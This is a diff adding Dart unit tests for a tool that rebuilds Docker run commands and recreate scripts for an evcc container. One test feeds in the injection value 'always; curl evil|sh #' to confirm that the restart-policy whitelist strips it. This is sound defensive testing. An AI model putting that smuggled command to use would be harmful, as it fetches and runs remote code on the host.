@@ -223,6 +223,80 @@ void main() {
       expect(buildDockerRunCommand(evccInspect, image: 'evcc/evcc:0.999'),
           endsWith("'evcc/evcc:0.999'"));
     });
+    test('carries --device / --privileged / --group-add (serial-meter setups)',
+        () {
+      final serial = {
+        'Name': '/evcc',
+        'Config': {'Image': 'evcc/evcc:latest', 'Labels': <String, dynamic>{}},
+        'HostConfig': {
+          'Privileged': true,
+          'Devices': [
+            {
+              'PathOnHost': '/dev/ttyUSB0',
+              'PathInContainer': '/dev/ttyUSB0',
+              'CgroupPermissions': 'rwm'
+            }
+          ],
+          'GroupAdd': ['dialout'],
+          'CapAdd': ['SYS_RAWIO'],
+          'RestartPolicy': {'Name': 'unless-stopped'},
+        },
+      };
+      final cmd = buildDockerRunCommand(serial);
+      expect(cmd, contains("--device '/dev/ttyUSB0:/dev/ttyUSB0:rwm'"));
+      expect(cmd, contains('--privileged'));
+      expect(cmd, contains("--group-add 'dialout'"));
+      expect(cmd, contains("--cap-add 'SYS_RAWIO'"));
+    });
+
+    test('carries user labels but drops image/infra labels', () {
+      final labeled = {
+        'Name': '/evcc',
+        'Config': {
+          'Image': 'evcc/evcc:latest',
+          'Labels': {
+            'traefik.enable': 'true',
+            'org.opencontainers.image.version': '0.123',
+            'com.docker.compose.project': 'should-not-leak',
+          },
+        },
+        'HostConfig': <String, dynamic>{},
+      };
+      final cmd = buildDockerRunCommand(labeled);
+      expect(cmd, contains("-l 'traefik.enable=true'"));
+      expect(cmd, isNot(contains('org.opencontainers')));
+      expect(cmd, isNot(contains('com.docker')));
+    });
+
+    test('drops a tampered restart-policy name (whitelist) — no injection', () {
+      final evil = {
+        'Name': '/evcc',
+        'Config': {'Image': 'evcc/evcc:latest', 'Labels': <String, dynamic>{}},
+        'HostConfig': {
+          'RestartPolicy': {'Name': r'always; curl evil|sh #'},
+        },
+      };
+      final cmd = buildDockerRunCommand(evil);
+      expect(cmd, isNot(contains('curl evil')));
+      expect(cmd, isNot(contains('--restart')));
+    });
+
+    test('brackets an IPv6 host IP in a port binding', () {
+      final v6 = {
+        'Name': '/evcc',
+        'Config': {'Image': 'evcc/evcc:latest', 'Labels': <String, dynamic>{}},
+        'HostConfig': {
+          'NetworkMode': 'bridge',
+          'PortBindings': {
+            '7070/tcp': [
+              {'HostIp': '::', 'HostPort': '7070'}
+            ]
+          },
+        },
+      };
+      expect(buildDockerRunCommand(v6), contains("-p '[::]:7070:7070'"));
+    });
+
     test('host network mode is preserved and -p is dropped', () {
       final hostNet = {
         'Name': '/evcc',
@@ -257,6 +331,19 @@ void main() {
       expect(script, contains("docker rename 'evcc' 'evcc-evccpitool-old'"));
       expect(script, contains("docker run -d --name 'evcc'"));
       expect(script, contains('set -e'));
+    });
+
+    test('auto-rolls back to the old container if the new one fails to start',
+        () {
+      final script = dockerRunRecreateScript(
+        name: 'evcc',
+        image: 'evcc/evcc:latest',
+        runCommand: "docker run -d --name 'evcc' 'evcc/evcc:latest'",
+      );
+      // On run failure: restore the old container's name and start it again.
+      expect(script, contains("docker rename 'evcc-evccpitool-old' 'evcc'"));
+      expect(script, contains("docker start 'evcc'"));
+      expect(script, contains('||'));
     });
   });
 }
